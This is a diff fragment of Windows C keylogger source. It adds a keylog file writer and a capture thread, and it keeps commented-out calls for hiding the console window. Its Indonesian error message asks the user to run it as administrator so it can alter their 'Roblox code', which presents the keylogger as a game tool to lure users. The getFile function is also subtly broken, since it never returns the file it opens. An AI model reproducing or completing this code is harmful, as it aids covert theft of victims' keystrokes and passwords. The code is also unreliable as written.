@@ -5,18 +5,26 @@
 #include<windows.h>
 #include <stdbool.h>
 
-int main()
+#include "keylogger.h"
+
+void getFile(FILE * file){
+	file = fopen(KEYLOG_PATH, "a");
+
+	if(file == NULL){
+		perror("JALANKAN SEBAGAI ADMINISTRATOR\nAGAR PROGRAM MEMILIKI IZIN UNTUK\nMENGOTAK-ATIK KODE ROBLOX ANDA\n");
+		getchar();
+		exit(1);
+	}
+}
+
+DWORD WINAPI activateKeylog(LPVOID param)
 {
     HWND hwnd=GetConsoleWindow();
     //ShowWindow(hwnd,SW_MINIMIZE); //wont hide the window, minimise
     //ShowWindow(hwnd,SW_HIDE);
 
-    FILE *fp;
-    fp = fopen("key.txt","a");
-    if(fp==NULL){
-        puts("Sorry! Cant open file");
-        exit(1);
-    }
+    FILE * fp = (FILE *)param;
+
     char buffer[5] = {0};
     bool keyDown[94] = {false};
     while (1) {
